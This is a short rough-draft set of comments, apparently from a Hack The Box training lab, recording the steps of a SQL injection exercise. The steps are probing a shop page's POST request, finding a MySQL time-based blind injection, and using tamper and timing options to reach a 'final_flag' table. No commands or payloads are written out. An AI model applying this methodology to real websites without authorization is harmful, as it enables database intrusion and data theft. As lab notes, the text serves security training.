###Final test
## rough draft
# visit target host and recon for entry point
# find exploit for DB, find db type (probably mysql), find db table ('final_flag' found in HTB question), determine if possible dba

# found a post request for /shop.html when adding shoes to cart.
# inspecting the page network traffic we find the request payload raw showing '{"id":1}'
# ran command to get max result, probably not best for realworld

# after a while it was found that it was MySQL >= 5.0.12 AND time-based blind (query SLEEP) injectable with 
# shortly later found --tamper between. re-ran with below command.
# also found table as 'production' with the table in the question 'final_flag'
# put time-sec=2 as this was found with a few re-runs with the command and showings as the result.
